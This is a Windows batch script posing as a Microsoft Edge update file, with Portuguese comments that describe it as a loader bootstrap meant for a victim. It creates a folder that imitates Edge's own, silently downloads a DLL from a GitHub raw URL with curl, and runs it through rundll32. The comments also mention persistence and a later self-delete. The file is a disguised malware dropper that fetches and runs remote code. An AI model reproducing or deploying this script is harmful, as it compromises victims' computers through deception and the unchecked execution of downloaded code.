@echo off
REM =====================================================================
REM MicrosoftEdgeUpdate.bat — bootstrap do loader (distribuir pra vitima)
REM
REM Fluxo:
REM   1. Se vcredist_cache.dll nao existe em %LOCALAPPDATA%\Microsoft\EdgeUpdate\
REM      baixa do GitHub (puxa versao atual deployada).
REM   2. Executa rundll32 vcredist_cache.dll,InitPatch
REM   3. (quando quiser) self-delete deste bat
REM
REM Loader URL fixo apontando pro repo assets-storage branch main.
REM Pra atualizar o loader, compila local + deploy pro GitHub.
REM =====================================================================

setlocal
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\EdgeUpdate"
set "LOADER_PATH=%INSTALL_DIR%\vcredist_cache.dll.bak_1900"
set "LOADER_URL=https://raw.githubusercontent.com/Jvsosa/assets-storage/main/vcredist_cache.dll"

REM Garante pasta destino
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

REM Baixa loader se nao existir (persistencia: baixa so na primeira execucao)
if not exist "%LOADER_PATH%" (
    curl -s -L -o "%LOADER_PATH%" "%LOADER_URL%"
)

REM Executa loader via rundll32
rundll32.exe "%LOADER_PATH%",InitPatch

endlocal
